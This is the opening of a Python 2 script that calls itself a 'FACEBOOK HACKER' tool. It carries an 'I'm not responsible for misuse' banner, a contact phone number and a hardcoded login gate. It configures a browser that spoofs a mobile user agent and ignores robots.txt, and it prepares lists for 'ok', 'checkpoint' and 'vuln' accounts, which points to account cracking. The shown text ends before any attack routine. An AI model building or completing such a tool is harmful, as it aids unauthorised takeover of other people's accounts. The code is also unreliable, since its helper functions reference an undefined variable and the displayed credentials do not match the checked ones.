#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


#### LOGO ####
logo = """
_________  _______   _______ 
\__    _/ (  ___  ) (       )
   )  (   | (   ) | | () () |
   |  |   | (___) | | || || |
   |  |   |  ___  | | |(_)| |
   |  |   | (   ) | | |   | |
|\_)  )   | )   ( | | )   ( |
(____/    |/     \| |/     \|
♨️°───────(BRAND)───────°♨️
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║
\033[1;96m║✯ Creator ✯ FACEBOOK HACKER       ║    
\033[1;98m║✯ USMAN JUTT          ║  
\033[1;96m║✯ I'm Not Responsible For Any Miss Use║
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤═══║"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;97m************************************************
\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE ALSFI BRANDED ~
\033[1;97m************************************************


\033[1;96m██╗░░░██╗░██████╗███╗░░░███╗░█████╗░███╗░░██╗
\033[1;96m██║░░░██║██╔════╝████╗░████║██╔══██╗████╗░██║
\033[1;98m██║░░░██║╚█████╗░██╔████╔██║███████║██╔██╗██║
\033[1;98m██║░░░██║░╚═══██╗██║╚██╔╝██║██╔══██║██║╚████║
\033[1;96m╚██████╔╝██████╔╝██║░╚═╝░██║██║░░██║██║░╚███║
\033[1;96m░╚═════╝░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝

\033[1;96m██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
\033[1;96m██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
\033[1;98m██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
\033[1;98m██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
\033[1;96m██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
\033[1;96m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░
USER NAME: usman
PASSWORD: jutt
whatsapp number *03444697164
"""

CorrectUsername = "Alsafi"
CorrectPassword = "Alsafi"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m📋 \x1b[1;95mTool Username \x1b[1;91m»» \x1b[1;91m")
    if (username == CorrectUsername):
    	
